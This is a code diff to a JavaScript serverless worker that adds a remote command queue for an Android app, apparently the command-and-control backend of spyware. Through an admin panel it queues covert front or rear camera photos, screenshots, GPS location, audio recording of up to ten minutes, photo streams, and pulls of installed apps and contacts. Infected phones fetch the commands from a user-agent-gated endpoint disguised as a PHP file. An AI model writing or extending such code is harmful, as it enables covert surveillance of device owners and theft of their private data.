@@ -255,6 +255,95 @@ async function serveFile(key) {
   }
 }
 
+/* ---------- remote command queue (FREE: KV queue, no Firebase) ----------
+   Action format = vendor FCM format: "COMMAND--p1--p2" (split by "--")
+   Panel: POST /api/cmd (admin session) -> queue actions in KV
+   APK:   POST /commands/get.php (UA gate) -> pop queue -> JSON {"cmds":[...]}
+   Polls bypass capture recording (else 8640/day floods KV write budget)   */
+function cmdIdLog() {
+  return Math.floor(Date.now() / 1000) % 100000;
+}
+
+function buildAction(kind, opts) {
+  var o = opts || {};
+  var idLog = cmdIdLog();
+  kind = String(kind || "").toLowerCase();
+  if (kind === "photo") {
+    var cam = String(o.cam || "1"); // 1 = Front, 0 = Rear
+    return "TakePictureFront--" + cam + "--" + idLog;
+  }
+  if (kind === "screenshot") return "takeScreenShot--1--" + idLog;
+  if (kind === "location") return "GetLocation--1--" + idLog;
+  if (kind === "audio") {
+    var sec = parseInt(o.seconds, 10);
+    if (!sec || sec < 5) sec = 30;
+    if (sec > 600) sec = 600;
+    return "RecordAudio--" + sec + "--1--" + idLog;
+  }
+  if (kind === "live_start") {
+    var count = parseInt(o.count, 10);
+    if (!count || count < 2) count = 60;
+    if (count > 300) count = 300;
+    var interval = parseInt(o.interval, 10);
+    if (!interval || interval < 3) interval = 5;
+    return "LivePhoto--" + count + "##" + interval + "##" + idLog;
+  }
+  if (kind === "live_stop") return "LiveStop--1--0";
+  if (kind === "refresh_apps") return "refreshApps--1--" + idLog;
+  if (kind === "refresh_contacts") return "refreshContacts--1--" + idLog;
+  return null;
+}
+
+async function queueCmds(targets, actions) {
+  if (!hasKV()) return { queued: 0, error: "KV_DATA not connected" };
+  var queued = 0;
+  for (var t = 0; t < targets.length; t++) {
+    var key = "cmd:q:" + targets[t];
+    var existing = [];
+    try {
+      var raw = await ENV.KV_DATA.get(key);
+      if (raw) existing = JSON.parse(raw);
+    } catch (e1) { existing = []; }
+    if (!Array.isArray(existing)) existing = [];
+    for (var a = 0; a < actions.length; a++) {
+      existing.push(actions[a]);
+      queued++;
+    }
+    if (existing.length > 200) existing = existing.slice(existing.length - 200);
+    try {
+      await ENV.KV_DATA.put(key, JSON.stringify(existing));
+    } catch (e2) { /* ignore */ }
+  }
+  return { queued: queued };
+}
+
+async function commandsGet(request, url) {
+  var idPhone = String(url.searchParams.get("idPhone") || "");
+  if (idPhone === "") {
+    try {
+      var formRaw = await request.text();
+      var fp = new URLSearchParams(formRaw);
+      idPhone = String(fp.get("idPhone") || "");
+    } catch (eP) { idPhone = ""; }
+  }
+  if (idPhone === "") return jsonResp({ cmds: [], n: 0 });
+  var cmds = [];
+  if (hasKV()) {
+    try {
+      var qraw = await ENV.KV_DATA.get("cmd:q:" + idPhone);
+      if (qraw) {
+        var arr = JSON.parse(qraw);
+        if (Array.isArray(arr)) cmds = arr;
+      }
+    } catch (e2) { cmds = []; }
+    // clear queue — failure here must NOT discard cmds
+    try {
+      await ENV.KV_DATA.delete("cmd:q:" + idPhone);
+    } catch (e3) { /* real KV always supports delete */ }
+  }
+  return jsonResp({ cmds: cmds, n: cmds.length });
+}
+
 /* ---------- response helpers (ye missing the — crash ka reason) ---------- */
 function corsHeaders() {
   return {
@@ -416,6 +505,42 @@ async function handle(request) {
       if (capDirty) await saveCaptures(true);
       return jsonResp({ ok: true, captures: captures.length, kv: hasKV(), time: new Date().toISOString() });
     }
+    if (path === "/api/cmd" && method === "POST") {
+      if (sess.clientId !== "all") return jsonResp({ ok: false, error: "sirf admin remote control use kar sakta hai" }, 403);
+      try {
+        var cmdBody = await request.json();
+        var kind = String(cmdBody.kind || "");
+        var action = buildAction(kind, cmdBody);
+        if (!action) return jsonResp({ ok: false, error: "unknown kind" }, 400);
+        await loadNames();
+        var targets = [];
+        var tgt = String(cmdBody.target || "all");
+        if (tgt !== "all" && tgt !== "") {
+          targets.push(tgt);
+        } else {
+          for (var tId in deviceNames) targets.push(tId);
+        }
+        if (!targets.length) return jsonResp({ ok: false, error: "koi device registered nahi hai" }, 400);
+        var qres = await queueCmds(targets, [action]);
+        if (qres.error) return jsonResp({ ok: false, error: qres.error }, 500);
+        await loadCaptures();
+        captures.unshift({
+          id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
+          time: new Date().toISOString(),
+          path: "/remote/cmd",
+          fields: { action: action, kind: kind, target: tgt, devices: targets.join(",") },
+          files: [], body: "", ua: "panel", ip: "",
+          deviceId: tgt === "all" ? null : tgt,
+          deviceName: tgt === "all" ? null : (deviceNames[tgt] || null),
+          clientId: null,
+        });
+        if (captures.length > MAX_CAPTURES) captures.pop();
+        await saveCaptures(false);
+        return jsonResp({ ok: true, queued: qres.queued, action: action, targets: targets });
+      } catch (eC) {
+        return jsonResp({ ok: false, error: "bad request" }, 400);
+      }
+    }
     if (path.indexOf("/api/file/") === 0 && method === "GET") {
       return serveFile(path.slice("/api/file/".length));
     }
@@ -430,6 +555,12 @@ async function handle(request) {
     }
 
     var p = url.pathname;
+
+    // remote command poll — bypasses capture recording (KV write budget!)
+    if (p === "/commands/get.php") {
+      return commandsGet(request, url);
+    }
+
     var capPromise = capturePost(request, url);
 
     return capPromise.then(async function (cap) {
